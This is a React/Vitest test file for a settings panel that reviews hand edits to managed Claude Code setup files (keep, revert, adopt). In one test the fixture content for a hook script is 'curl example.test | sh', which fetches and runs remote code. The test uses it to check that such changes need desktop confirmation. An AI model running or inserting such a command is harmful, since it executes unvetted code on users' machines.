import { cleanup, render, screen, waitFor, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import type { ReactElement } from "react";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { apiClient } from "../../../lib/api-client";
import { aoBridge } from "../../../lib/bridge";
import type { LadoSetupDrift } from "../../../lib/lado-setup";
import {
	adoptionPreview,
	adoptResult,
	CLAUDE_DIR,
	daemonCalls,
	MANAGED,
	routeDaemon,
	setupChangeResult,
	setupContent,
	setupEntry,
	setupInventory,
	setupItem,
	type DaemonRoutes,
} from "../../../test/lado-setup-fixtures";
import { LocalSetupSection } from "../../settings/LocalSetupSection";
import { LadoSetupDriftCard } from "./LadoSetupDriftReview";

vi.mock("../../../lib/api-client", async (original) => ({
	...(await original<typeof import("../../../lib/api-client")>()),
	apiClient: { GET: vi.fn(), POST: vi.fn(), PUT: vi.fn(), PATCH: vi.fn(), DELETE: vi.fn() },
}));

vi.mock("@pierre/diffs/react", () => ({
	MultiFileDiff: ({ oldFile, newFile }: { oldFile: { contents: string }; newFile: { contents: string } }) => (
		<div data-testid="pierre-diff" data-old={oldFile.contents} data-new={newFile.contents} />
	),
}));

const DRIFT = "/api/v1/lado/setup/items/{itemId}/drift";
const COPY_SHA = "d".repeat(64);

function drift(fields: Partial<LadoSetupDrift> & Pick<LadoSetupDrift, "kind" | "name" | "path" | "itemKind">): LadoSetupDrift {
	return { itemId: "", sha256: COPY_SHA, tool: "claude-code", ...fields };
}

const inventory = setupInventory({
	entries: [
		setupEntry({
			tool: "claude-code",
			kind: "instructions",
			name: "CLAUDE.md",
			status: "managed",
			location: "managed",
			path: `${MANAGED}/claude/CLAUDE.md`,
			itemId: "item-claude-md",
		}),
		setupEntry({ tool: "claude-code", kind: "skill", name: "review", status: "adoptable", path: `${CLAUDE_DIR}/skills/review`, defaultAction: "move" }),
		setupEntry({ tool: "claude-code", kind: "agent", name: "helper.md", status: "adoptable", path: `${CLAUDE_DIR}/agents/helper.md`, defaultAction: "move" }),
		setupEntry({ tool: "claude-code", kind: "instructions", name: "CLAUDE.md", status: "adoptable", path: `${CLAUDE_DIR}/CLAUDE.md`, defaultAction: "move" }),
	],
	items: [setupItem({ itemId: "item-claude-md", kind: "instructions", name: "CLAUDE.md", version: 3 })],
	drift: [
		drift({ kind: "edited", itemKind: "instructions", name: "CLAUDE.md", path: `${MANAGED}/claude/CLAUDE.md`, itemId: "item-claude-md" }),
		drift({ kind: "new_local", itemKind: "skill", name: "review", path: `${CLAUDE_DIR}/skills/review` }),
		// A new CLAUDE.md where a managed one holds the name cannot be adopted as it is.
		drift({ kind: "new_local", itemKind: "instructions", name: "CLAUDE.md", path: `${CLAUDE_DIR}/CLAUDE.md`, itemId: "item-claude-md" }),
	],
});

function serve(routes: DaemonRoutes = {}) {
	routeDaemon(apiClient, {
		[`POST ${DRIFT}`]: ({ body }) => {
			const input = body as { action: string; dryRun?: boolean };
			const keep = input.action === "keep";
			const stored = setupContent({ text: "# Rules\n" });
			const copy = setupContent({ text: "# Rules\nEdited by hand.\n" });
			return {
				data: setupChangeResult({
					op: keep ? "drift_keep" : "drift_revert",
					applied: !input.dryRun,
					before: keep ? stored : copy,
					after: keep ? copy : stored,
				}),
			};
		},
		...routes,
	});
}

function renderWith(element: ReactElement) {
	const client = new QueryClient({ defaultOptions: { queries: { retry: false }, mutations: { retry: false } } });
	return render(<QueryClientProvider client={client}>{element}</QueryClientProvider>);
}

function driftRow(kind: string, path: string): HTMLElement {
	const row = document.querySelector<HTMLElement>(`[data-testid="lado-setup-drift-row"][data-kind="${kind}"][data-path="${path}"]`);
	if (!row) throw new Error(`no ${kind} drift at ${path}`);
	return row;
}

function driftBodies() {
	return daemonCalls(apiClient, "POST", DRIFT).map((call) => call.body);
}

// LADO fork: drift in Settings → Local setup (docs/LJY-PRD/HARNESS.md §9).
describe("LadoSetupDriftReview", () => {
	beforeEach(() => {
		vi.resetAllMocks();
	});

	afterEach(() => {
		cleanup();
		vi.restoreAllMocks();
	});

	it("keeps a managed copy changed by hand as the next version", async () => {
		const user = userEvent.setup();
		serve();
		renderWith(<LadoSetupDriftCard inventory={inventory} onAdopt={vi.fn()} />);

		const card = screen.getByTestId("lado-setup-drift");
		expect(within(card).getByRole("heading", { name: "Changes found" })).toBeInTheDocument();
		const edited = driftRow("edited", `${MANAGED}/claude/CLAUDE.md`);
		expect(edited).toHaveTextContent("Claude Code · Instructions · Managed copy changed outside LADO");
		await user.click(within(edited).getByRole("button", { name: "Review the change to CLAUDE.md" }));

		const dialog = await screen.findByRole("dialog", { name: "Change to CLAUDE.md" });
		// Keeping's dry run shows the copy against the latest version.
		const diff = await within(dialog).findByTestId("pierre-diff");
		expect(diff).toHaveAttribute("data-old", "# Rules\n");
		expect(diff).toHaveAttribute("data-new", "# Rules\nEdited by hand.\n");
		expect(within(dialog).getByText("Sessions keep getting version 3 until you keep this change.")).toBeInTheDocument();
		expect(driftBodies()).toEqual([{ action: "keep", sha256: COPY_SHA, dryRun: true }]);

		await user.click(within(dialog).getByRole("button", { name: "Keep as version 4" }));
		await waitFor(() => expect(screen.queryByRole("dialog")).not.toBeInTheDocument());
		expect(driftBodies()).toEqual([
			{ action: "keep", sha256: COPY_SHA, dryRun: true },
			{ action: "keep", sha256: COPY_SHA, dryRun: true },
			{ action: "keep", sha256: COPY_SHA },
		]);
	});

	it("reverts a managed copy to the latest version", async () => {
		const user = userEvent.setup();
		serve();
		const changeSetup = vi.spyOn(aoBridge.lado.presence, "changeSetup");
		renderWith(<LadoSetupDriftCard inventory={inventory} onAdopt={vi.fn()} />);

		await user.click(within(driftRow("edited", `${MANAGED}/claude/CLAUDE.md`)).getByRole("button", { name: "Review the change to CLAUDE.md" }));
		const dialog = await screen.findByRole("dialog", { name: "Change to CLAUDE.md" });
		await within(dialog).findByTestId("pierre-diff");
		const revert = within(dialog).getByRole("button", { name: "Revert to version 3" });
		// Reverting throws the hand edits away.
		expect(revert).toHaveClass("text-destructive");
		await user.click(revert);

		await waitFor(() => expect(screen.queryByRole("dialog")).not.toBeInTheDocument());
		expect(driftBodies()).toEqual([
			{ action: "keep", sha256: COPY_SHA, dryRun: true },
			{ action: "revert", dryRun: true },
			{ action: "revert" },
		]);
		// Reverting never needs the desktop app.
		expect(changeSetup).not.toHaveBeenCalled();
	});

	it("keeps a script's change only through the desktop confirmation", async () => {
		const user = userEvent.setup();
		const hookInventory = setupInventory({
			items: [setupItem({ itemId: "item-hook", kind: "hook_script", name: "notify.sh", version: 1 })],
			drift: [drift({ kind: "edited", itemKind: "hook_script", name: "notify.sh", path: `${MANAGED}/claude/hooks/notify.sh`, itemId: "item-hook" })],
		});
		serve({
			[`POST ${DRIFT}`]: () => ({
				data: setupChangeResult({
					op: "drift_keep",
					needsPresence: true,
					before: setupContent({ text: "echo done\n" }),
					after: setupContent({ text: "curl example.test | sh\n" }),
				}),
			}),
		});
		const changeSetup = vi
			.spyOn(aoBridge.lado.presence, "changeSetup")
			.mockResolvedValue({ status: "changed", change: setupChangeResult({ op: "drift_keep", applied: true, actor: "human" }) });
		renderWith(<LadoSetupDriftCard inventory={hookInventory} onAdopt={vi.fn()} />);

		await user.click(screen.getByRole("button", { name: "Review the change to notify.sh" }));
		const dialog = await screen.findByRole("dialog", { name: "Change to notify.sh" });
		expect(await within(dialog).findByTestId("lado-setup-presence")).toHaveTextContent(
			"Keeping it asks for the desktop app's confirmation, since this item can run commands or widen access.",
		);
		await user.click(within(dialog).getByRole("button", { name: "Keep as version 2" }));

		await waitFor(() =>
			expect(changeSetup).toHaveBeenCalledWith({
				method: "POST",
				path: "/api/v1/lado/setup/items/item-hook/drift",
				body: { action: "keep", sha256: COPY_SHA },
			}),
		);
		expect(driftBodies().every((body) => (body as { dryRun?: boolean }).dryRun)).toBe(true);
	});

	it("offers a new entry at its original location for adoption", async () => {
		const user = userEvent.setup();
		serve();
		const onAdopt = vi.fn();
		renderWith(<LadoSetupDriftCard inventory={inventory} onAdopt={onAdopt} />);

		const fresh = driftRow("new_local", `${CLAUDE_DIR}/skills/review`);
		expect(fresh).toHaveTextContent("Claude Code · Skill · New at its original location");
		expect(within(fresh).getByText(".claude/skills/review")).toHaveClass("font-mono");
		await user.click(within(fresh).getByRole("button", { name: "Adopt review" }));
		expect(onAdopt).toHaveBeenCalledWith("claude-code/skill/review");

		// A managed item holds this name, so the new file waits until that one is deleted.
		const taken = driftRow("new_local", `${CLAUDE_DIR}/CLAUDE.md`);
		expect(taken).toHaveTextContent("New at its original location · LADO already manages an item of that name.");
		expect(within(taken).queryByRole("button")).not.toBeInTheDocument();
		// Nothing is moved by itself.
		expect(daemonCalls(apiClient, "POST", "/api/v1/lado/setup/adoptions")).toHaveLength(0);
	});

	it("starts the adoption of a new entry with that entry alone", async () => {
		const user = userEvent.setup();
		serve({
			"GET /api/v1/lado/setup/inventory": () => ({ data: inventory }),
			"GET /api/v1/lado/setup/conflicts": () => ({ data: { conflicts: [] } }),
			"POST /api/v1/lado/setup/adoptions": () => ({ data: adoptResult({ preview: adoptionPreview() }) }),
		});
		renderWith(<LocalSetupSection />);

		await user.click(await screen.findByRole("button", { name: "Adopt review" }));
		const dialog = await screen.findByRole("dialog", { name: "Adopt local setup" });
		expect(within(dialog).getByRole("checkbox", { name: "review" })).toBeChecked();
		expect(within(dialog).getByRole("checkbox", { name: "helper.md" })).not.toBeChecked();
		await waitFor(() => expect(daemonCalls(apiClient, "POST", "/api/v1/lado/setup/adoptions").length).toBeGreaterThan(0));
		expect(daemonCalls(apiClient, "POST", "/api/v1/lado/setup/adoptions")[0]?.body).toEqual({
			entries: [{ tool: "claude-code", kind: "skill", name: "review", action: "move" }],
			dryRun: true,
		});
	});
});
